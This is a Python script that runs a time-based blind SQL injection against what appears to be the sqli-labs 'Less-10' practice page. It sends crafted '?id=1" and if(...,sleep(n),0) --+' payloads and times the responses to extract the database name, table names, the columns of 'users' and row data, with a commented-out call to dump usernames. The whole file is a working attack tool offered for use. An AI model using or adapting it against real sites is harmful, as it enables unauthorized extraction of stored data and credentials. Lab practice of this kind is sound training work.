#coding:utf-8
import requests
import datetime
import time

url = 'http://example.com/Less-10/'


def database_len():
    for i in range(1,15):
        
        payload = '?id=1" and if(length(database())>%s,sleep(2),0) --+' %i
        #payload = "?id=1' and if(length(database())>%s,sleep(2),0) --+" %i
        time1 = datetime.datetime.now()
        r = requests.get(url+ payload)
        time2 = datetime.datetime.now()
        sec = (time2 - time1).seconds
        if sec >= 2:
            print(i)
        else:
            print(i)
            break
    print('database_len:',i)
    return i

def database_name(len):
    name = ''
    for i in range(1,len+1):
        for j in '0123456789abcdefghijklmnopqrstuvwxyz':
            payload = '?id=1" and if(substr(database(),%d,1)="%s",sleep(3),1) --+' % (i,j)
            #payload = "?id=1' and if(substr(database(),%d,1)='%s',sleep(3),1) --+" % (i,j)
            time1 = datetime.datetime.now()
            r = requests.get(url + payload)
            time2 = datetime.datetime.now()
            sec = (time2 - time1).seconds
            if sec >=3:
                name += j
                print(name)
                break
    print('database_name:',name)

def table_name():
    name = ''
    for k in range(6):
        for i in range(10):
            for j in range(65,123):
                payload = '?id=1" and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1))=%d,sleep(3),0) --+' % (k, i, j)
                #payload = "?id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1))=%d,sleep(3),0) --+" % (k, i, j)
                time1 = datetime.datetime.now()
                r = requests.get(url+payload)
                time2 = datetime.datetime.now()
                sec = (time2-time1).seconds
                if sec >= 3:
                    name += chr(j)
                    print(chr(j))
                    break
        print("table_name:",name)
        name = ''

def colum_name(table_name):
    name = ''
    for k in range(6):
        for i in range(10):
            for j in range(65, 123):
                payload = '?id=1" and if(ascii(substr((select column_name from information_schema.columns where table_name="%s" and table_schema=database() limit %d,1),%d,1))=%d,sleep(3),0) --+' % (table_name, k, i, j)
                #payload = "?id=1' and if(ascii(substr((select column_name from information_schema.columns where table_name='%s' and table_schema=database() limit %d,1),%d,1))=%d,sleep(3),0) --+" % (table_name, k, i, j)
                time1 = datetime.datetime.now()
                r = requests.get(url+payload)
                time2 = datetime.datetime.now()
                sec = (time2-time1).seconds
                if sec >= 3:
                    name += chr(j)
                    print(chr(j))
                    break
        print("column_name:", name)
        name = ''

def data(column,table):
    name = ''
    for k in range(6):
        for i in range(1,10):
            for j in range(65,123):
                payload = '?id=1" and if(ascii(substr((select %s from %s limit %d,1),%d,1))=%d, sleep(2),0)--+' % (column,table,k,i,j)
                #payload = "?id=1' and if(ascii(substr((select %s from %s limit %d,1),%d,1))=%d, sleep(2),0)--+" % (column,table,k,i,j)
                time1 = datetime.datetime.now()
                r = requests.get(url+payload)
                time2 = datetime.datetime.now()
                sec = (time2-time1).seconds
                if sec >= 2:
                    name += chr(j)
                    print(chr(j))
                    break
        print("data:", name)
        name = ''

if __name__ == '__main__':
    len = database_len()
    database_name(len)
    table_name()
    colum_name('users')
    # data('username','users')
